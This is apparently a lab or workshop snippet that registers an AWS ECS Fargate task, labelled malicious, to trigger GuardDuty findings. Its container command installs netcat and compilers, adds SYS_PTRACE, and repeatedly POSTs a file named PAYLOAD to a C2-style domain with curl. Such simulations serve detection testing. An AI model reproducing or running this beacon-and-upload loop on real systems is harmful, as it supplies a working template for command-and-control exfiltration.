Read pdf note

<!--  Malicious Task -->

cat << EOF > malicious-guardduty-taskdef.json
{
    "family": "malicious-guardduty-task",
    "networkMode": "awsvpc",
    "requiresCompatibilities": [
        "FARGATE"
    ],
    "cpu": "1024",
    "memory": "2048",
    "runtimePlatform": {
        "cpuArchitecture": "X86_64",
        "operatingSystemFamily": "LINUX"
    },
    "containerDefinitions": [
        {
            "name": "guardduty-test",
            "image": "public.ecr.aws/ubuntu/ubuntu:22.04",
            "portMappings": [],
            "essential": true,
            "entryPoint": [
                "sh",
                "-c"
            ],
            "command": [
                "while true; do sleep 30;apt update -y;apt install python3 curl gcc netcat-openbsd g++ sudo zip -y; dd if=/dev/random of=PAYLOAD bs=1024 count=1;curl -X POST -F \"file=@PAYLOAD\" -s --connect-timeout 1 http://c2.guarddutyc2activityb.com/sample.dat > /dev/null; echo \"done!\";sleep 60; done"
            ],
            "environment": [],
            "mountPoints": [],
            "volumesFrom": [],
            "linuxParameters": {
                "capabilities": {
                    "add": [
                        "SYS_PTRACE"
                    ],
                    "drop": []
                }
            },
            "privileged": false,
            "logConfiguration": {
                "logDriver": "awslogs",
                "options": {
                    "awslogs-group": "retail-store-ecs-tasks",
                    "awslogs-region": "${AWS_REGION}",
                    "awslogs-stream-prefix": "guardduty"
                }
            }
        }
    ],
    "executionRoleArn": "arn:aws:iam::${ACCOUNT_ID}:role/retailStoreEcsTaskExecutionRole",
    "taskRoleArn": "arn:aws:iam::${ACCOUNT_ID}:role/retailStoreEcsTaskRole"
}
EOF

aws ecs register-task-definition --cli-input-json file://malicious-guardduty-taskdef.json